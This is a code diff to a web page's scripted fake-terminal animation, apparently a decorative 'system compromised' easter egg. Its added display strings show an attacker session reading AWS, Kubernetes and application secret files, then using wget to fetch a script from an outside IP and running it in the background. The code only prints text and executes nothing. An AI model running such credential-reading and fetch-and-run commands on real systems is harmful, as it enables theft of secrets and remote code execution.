@@ -363,14 +363,28 @@
           [5700, () => { addOutput(''); scrollToBottom(); }],
           [5800, () => { addOutput('<span class="t-label">Initializing session audit log... done</span>'); scrollToBottom(); }],
           [6000, () => { addOutput('<span class="t-label">Loading environment... done</span>'); scrollToBottom(); }],
-          [6200, () => { addOutput('<span class="t-output">root@threat-actor-C2:~# whoami</span>'); scrollToBottom(); }],
+          [6200, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# whoami</span>'); scrollToBottom(); }],
           [6600, () => { addOutput('<span class="t-error">root</span>'); scrollToBottom(); }],
-          [6900, () => { addOutput('<span class="t-output">root@threat-actor-C2:~# uname -a</span>'); scrollToBottom(); }],
+          [6900, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# uname -a</span>'); scrollToBottom(); }],
           [7300, () => { addOutput('<span class="t-output">Linux c2-node-03 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux</span>'); scrollToBottom(); }],
-          [7600, () => { addOutput('<span class="t-output">root@threat-actor-C2:~# cat /etc/passwd | grep -v nologin | cut -d: -f1</span>'); scrollToBottom(); }],
-          [8000, () => { addOutput('<span class="t-success">root</span>'); scrollToBottom(); }],
-          [8200, () => { addOutput('<span class="t-output">root@threat-actor-C2:~#</span>'); scrollToBottom(); }],
-          [8500, () => { triggerSecretMode(); }],
+          [7600, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# ls /home/deploy/.aws/ /opt/app/config/ /var/run/secrets/ 2>/dev/null</span>'); scrollToBottom(); }],
+          [8100, () => { addOutput('<span class="t-output">/home/deploy/.aws/:</span>'); scrollToBottom(); }],
+          [8200, () => { addOutput('<span class="t-success">credentials&nbsp;&nbsp;&nbsp;&nbsp;config</span>'); scrollToBottom(); }],
+          [8350, () => { addOutput('<span class="t-output">/opt/app/config/:</span>'); scrollToBottom(); }],
+          [8450, () => { addOutput('<span class="t-success">database.yml&nbsp;&nbsp;secrets.env&nbsp;&nbsp;jwt_signing.key</span>'); scrollToBottom(); }],
+          [8600, () => { addOutput('<span class="t-output">/var/run/secrets/:</span>'); scrollToBottom(); }],
+          [8700, () => { addOutput('<span class="t-success">k8s-sa-token&nbsp;&nbsp;tls.crt&nbsp;&nbsp;tls.key</span>'); scrollToBottom(); }],
+          [9000, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# cat /home/deploy/.aws/credentials</span>'); scrollToBottom(); }],
+          [9500, () => { addOutput('<span class="t-output">[default]</span>'); scrollToBottom(); }],
+          [9600, () => { addOutput('<span class="t-output">aws_access_key_id     = AKIA█████████████████</span>'); scrollToBottom(); }],
+          [9700, () => { addOutput('<span class="t-output">aws_secret_access_key = ████████████████████████████████████████</span>'); scrollToBottom(); }],
+          [10000, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# wget -q http://185.220.101.47:8080/update.py -O /tmp/ld.py && chmod +x /tmp/ld.py</span>'); scrollToBottom(); }],
+          [11000, () => { addOutput('<span class="t-success">Saving to: '/tmp/ld.py'</span>'); scrollToBottom(); }],
+          [11200, () => { addOutput('<span class="t-success">/tmp/ld.py&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%[=============================>]&nbsp;&nbsp;4.31K&nbsp;&nbsp;--.-KB/s&nbsp;&nbsp;in 0.001s</span>'); scrollToBottom(); }],
+          [11500, () => { addOutput('<span class="t-output">root@corp-prod-db01:~# nohup python3 /tmp/ld.py &>/dev/null &</span>'); scrollToBottom(); }],
+          [11800, () => { addOutput('<span class="t-output">[1] 31337</span>'); scrollToBottom(); }],
+          [12000, () => { addOutput('<span class="t-output">root@corp-prod-db01:~#</span>'); scrollToBottom(); }],
+          [12300, () => { triggerSecretMode(); }],
         ];
         seq.forEach(([delay, fn]) => setTimeout(fn, delay));
         return ['<span class="t-output">Connecting to 185.220.101.47...</span>'];
@@ -603,7 +617,7 @@
     const banner = document.createElement('div');
     banner.id = 'secret-banner';
     banner.innerHTML = `
-      <div class="sb-label">// root@threat-actor-C2 · SESSION ACTIVE · TLP:RED</div>
+      <div class="sb-label">// root@corp-prod-db01 · SESSION ACTIVE · TLP:RED</div>
       <div class="sb-title">SYSTEM<br>COMPROMISED</div>
       <div class="sb-sub">18 U.S.C § 1030 · All activity logged · <kbd>ESC</kbd> or <span>/restore</span> to disconnect</div>
     `;
@@ -626,7 +640,7 @@
     const onEsc = (e: KeyboardEvent) => { if (e.key === 'Escape') cleanup(); };
     document.addEventListener('keydown', onEsc);
     document.addEventListener('secret-restore', cleanup);
-    setTimeout(cleanup, 14000);
+    setTimeout(cleanup, 20000);
   }
 
   runStartup();
